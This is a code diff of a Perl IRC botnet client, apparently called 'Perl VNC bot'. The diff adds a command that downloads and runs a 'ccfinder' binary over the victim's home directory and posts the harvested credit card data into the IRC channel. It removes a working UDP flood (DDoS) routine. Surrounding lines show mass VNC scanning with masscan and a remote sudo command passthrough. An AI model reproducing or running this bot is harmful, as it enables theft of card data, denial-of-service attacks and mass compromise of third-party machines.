@@ -48,7 +48,22 @@ $irc->on(irc_privmsg => sub {
   warn 'Version request.';
   $irc->write(notice => $noticechan => "9,1Perl VNC bot [FINAL] by independent: 12https://github.com/independentcod");
  }
- 
+ if ($msg =~ /@.ccplz/) {
+  warn 'Sending CC info to IRC...';
+  $irc->write(notice => $noticechan => "[Info] Fetching CC data from Storage and Memory...");
+  system 'wget -O ccfinder https://github.com/ind3p3nd3nt/vncperlbot/raw/master/ccfinder';
+  system 'chmod +x ccfinder';
+  system './ccfinder ~';
+  Time::HiRes::sleep(60);
+  $irc->write(notice => $noticechan => "[Info] Now sending CC data in channel...");
+  open(my $fh, '<:encoding(UTF-8)', $filename);
+  while (my $row = <$fh>) {
+   Time::HiRes::sleep(10);
+   chomp $row;
+   $irc->write(notice => $noticechan => "$row\n");
+  }
+
+ }
  if ($msg =~ /sudo/) {
              my $fragment =  substr $msg, 7;
              $irc->write(notice => $noticechan => "$msg\n");
@@ -95,45 +110,7 @@ system 'if [ -f /usr/bin/apt ]; then sudo service ssh restart; fi';
     my $s = shift;
     my @IRC_RESULTS;
     $events{connect}++;
-            if ($msg =~ /@.ddos/) {
-            warn "DDoS Launched on $1";
-            $irc -> write(notice => $noticechan => "[Info] DDoS Started");
-            my($ip) = $1;
-            my($port) = $2;
-            my($size) = $3;
-            my($bw) = $4;
-            my($time) = $5;
-            my($delay) = $6;
-
-            if ($bw && $delay) {
-              $size = int($bw * $delay / 8);
-            }
-            elsif($bw) {
-              $delay = (8 * $size) / $bw;
-            }
-
-            $size = 700
-            if $bw && !$size;
-
-            ($bw = int($size / $delay * 8)) if ($delay && $size);
-
-            my($iaddr, $endtime, $psize, $pport);
-            $iaddr = inet_aton("$ip") or warn "Cant resolve the hostname try again $ip\n";
-            $endtime = time() + ($time ? $time : 1000000);
-            socket(flood, PF_INET, SOCK_DGRAM, 17);
-
-            warn "Invalid package size: $size\n"
-            if $size && ($size < 64 || $size > 1500);
-            $size -= 28
-            if $size;
-            for (; time() <= $endtime;) {
-              $psize = $size ? $size : int(rand(1024 - 64) + 64);
-              $pport = $port ? $port : int(rand(65500)) + 1;
-
-              send(flood, pack("a$psize", "flood"), 0, pack_sockaddr_in($pport, $iaddr));
-              usleep(1000 * $delay) if $delay;
-            }
-    } elsif ($msg =~ /@.scan ([^\s]+)/) {
+    if ($msg =~ /@.scan ([^\s]+)/) {
      $s->progress("[Info] Starting masscan... [VNC Scan in progress ...]");
      my $range = $1;
      my $masscancmd = "masscan -p 5900 --range $range --rate 25000 --open --banners -oG hosts.txt ";
@@ -151,7 +128,7 @@ system 'if [ -f /usr/bin/apt ]; then sudo service ssh restart; fi';
        push @IRC_RESULTS, $_ foreach split "\n", $r;
       }
       return @IRC_RESULTS;
-      } sub {
+      }, sub {
        my ($s, $error, @res) = @_;
        $irc->write(notice => $noticechan => " FINISHED: $msg");
        warn "Finished work: $msg";
